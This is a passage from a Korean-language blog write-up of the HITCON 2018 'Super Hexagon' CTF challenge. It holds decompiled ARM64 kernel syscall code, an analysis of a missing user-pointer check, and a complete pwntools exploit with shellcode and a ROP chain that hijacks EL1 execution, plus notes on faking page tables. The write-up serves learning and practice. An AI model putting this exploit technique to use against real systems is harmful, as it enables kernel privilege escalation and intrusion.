</span></span><span style="display:flex;"><span>  puVar9 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">**</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  uVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>  puVar7 <span style="color:#f92672">=</span> puVar9;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (uVar4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3f</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (puVar9 <span style="color:#f92672">!=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>      iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0009ad8</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        puVar7 <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>puVar10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>        puVar7 <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/897d9eab886106a9fb3854d3eeafbc71.png" alt=""  />

EC field에 대해 접근하고 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/05850d04d2bdbd1980000d9cceaf6ca5.png" alt=""  />

딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>   ...
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ((x8 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000000</span>) {
</span></span><span style="display:flex;"><span>          usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_ffffffffc0008a34</span>(x8,x0,x1,x2);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">**</span>)param_1 <span style="color:#f92672">=</span> usr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>그리고 0xff로 마스킹되어서 처리하는 부분이 있는데, 여긴 secure world 관련 처리 로직이니 나중에 분석한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a27a6c6b0011f9ff1c9ddc4c624e2f08.png" alt=""  />

sys_read는 위 0xffffffffc9000000을 읽는다.
IPA는 0x3b000이며 PA는 0x9000000이다.
여긴 UART 공간이다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4b2a63d6327f5f75dd1596be251140bf.png" alt=""  />

Memory mapped io (MMIO) 방식이다.
DMA와 함께 쓰인다.
sys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* read */</span>
</span></span><span style="display:flex;"><span>  usr <span style="color:#f92672">=</span> x2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3f</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x2 <span style="color:#f92672">!=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>      iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0009ad8</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>x1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>        usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* write */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x40</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (usr_page <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>; usr_page <span style="color:#f92672">&lt;</span> x2; usr_page <span style="color:#f92672">=</span> usr_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_ffffffffc0009aa4</span>(usr_page[(<span style="color:#66d9ef">long</span>)x1]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5d</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_ffffffffc00091b0</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* mmap  */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xde</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (((ulong)x1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_ffffffffc00086e8</span>(x1);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (usr <span style="color:#f92672">!=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>              phys <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0008530</span>(x1);
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">for</span> (usr_page <span style="color:#f92672">=</span> usr; usr_page <span style="color:#f92672">&lt;</span> x1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)usr; usr_page <span style="color:#f92672">=</span> usr_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">FUN_ffffffffc0008864</span>(usr_page,usr_page <span style="color:#f92672">+</span> (phys <span style="color:#f92672">-</span> (<span style="color:#66d9ef">long</span>)usr),(ulong)x2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> );
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>처음에는 눈치를 못챘지만 모든 구현된 시스템 콜들을 분석하고 나서 다시 코드를 처음부터 봤더니 이상함을 느꼈다.
왜냐하면 ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없었기 때문이다.
다른 시스템 콜들의 경우 아래와 같이 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f3932dcbcd59271f076d99aa50a41130.png" alt=""  />
</p>
<p>ret 1 byte overwrite → print_flag
ropper로 쭉 뽑고 보다가 0xffffffffc0009130를 쓸 수 있을 것 같아서 확인해보았다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     fffc0009130 fc  <span style="color:#ae81ff">7f</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x28 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf8</span> ]
</span></span><span style="display:flex;"><span>     fffc0009134 <span style="color:#ae81ff">1</span>c  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">18</span>  d5    msr        sp_el0 ,x28
</span></span><span style="display:flex;"><span>     fffc0009138 fc  <span style="color:#ae81ff">77</span>  <span style="color:#ae81ff">4</span>e  a9    ldp        x28 ,x29 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_24 ]
</span></span><span style="display:flex;"><span>     fffc000913c c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/966ec93ec69b3c16a73e85ce3659545c.png" alt=""  />

handler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     fffc0009430 f3  <span style="color:#ae81ff">53</span>  <span style="color:#ae81ff">41</span>  a9    ldp        x19 ,x20 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>local_10 ]
</span></span><span style="display:flex;"><span>     fffc0009434 fd  <span style="color:#ae81ff">7</span>b  c2  a8    ldp        x29 <span style="color:#f92672">=&gt;</span>local_20 ,x30 ,[sp], <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>     fffc0009438 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>더 찾다가 위 가젯을 찾았다.
sp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/bf3dcbc5e1b2686e60a9d50861c8f7d2.png" alt=""  />
</p>
<h2 id="exploit-code-flag-1">Exploit code (flag)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-flag-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>stack_x29_x30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0019bb0</span>
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> stack_x29_x30<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> stack_x29_x30 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># x29</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xffffffffc000847c</span>) <span style="color:#75715e"># x30</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffffffc000847c: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; </span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00007ffeffffe000</span>) <span style="color:#75715e"># x19 [EL0/R-X EL1/R-- ACCESSED GLOBAL]</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># x20</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e">#x29</span>
</span></span><span style="display:flex;"><span>ropchain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xffffffffc0008408</span><span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#75715e"># this will raise exception after ret</span>
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(ropchain)<span style="color:#75715e"># sfp</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">movz x11, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>(addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movz x11, #</span><span style="color:#e6db74">{</span>((ret)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((ret)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((ret)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>(ret)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(ropchain)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x94</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="gaining-code-execution">Gaining code execution<a hidden class="anchor" aria-hidden="true" href="#gaining-code-execution">#</a></h2>
<p>Arm manual 정리하면서 page descriptor도 정리했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/89ac8cbe2ee124fd2a1b1faaf7506c84.png" alt=""  />

Two VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다.
VA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다.
이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다.
잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다.
PAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f0426c50516cf19fabe5499a8ac8153c.png" alt=""  />

혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없는 것으로 보인다.</p>
